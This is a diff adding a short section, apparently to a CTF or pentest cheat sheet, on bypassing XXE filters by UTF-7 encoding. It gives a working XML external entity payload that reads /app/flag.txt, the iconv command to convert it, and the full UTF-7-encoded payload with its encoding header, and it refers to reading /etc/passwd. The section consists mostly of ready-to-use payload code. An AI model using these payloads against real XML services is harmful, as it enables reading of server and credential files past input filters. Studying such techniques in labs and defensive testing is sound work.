@@ -3651,6 +3651,47 @@ class dirty(BaseModule):
 
 ----------------
 
+### XXE bypass with utf-7
+
+---------------
+
+- utf-8 code-:
+
+```xml
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]><data><weight>&example;</weight><height>100</height></data>
+```
+
+- Convert it with `iconv`,Syntax-:
+
+```bash
+iconv -f utf-8 -t utf-7 < me.xml
+```
+
+![image](https://github.com/user-attachments/assets/ab77a9f7-3bcb-4847-9765-f4e5583431fa)
+
+- Add this header before you make the request
+
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
+```
+
+- Full Code-:
+
+```xml
+<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo +AFsAPAAh-ENTITY example SYSTEM +ACI-/app/flag.txt+ACIAPg +AF0APgA8-data+AD4APA-weight+AD4AJg-example+ADsAPA-/weight+AD4APA-height+AD4-100+ADw-/height+AD4APA-/data+AD4-
+```
+
+![image](https://github.com/user-attachments/assets/40aef5aa-bdf4-4435-9354-cc62f31ed446)
+
+- Reading `/etc/passwd`-:
+
+![image](https://github.com/user-attachments/assets/d73eb9ab-27d1-46c1-a69c-b90f9aa48bae)
+
+---------------------
+
+
+
+
 
 
 
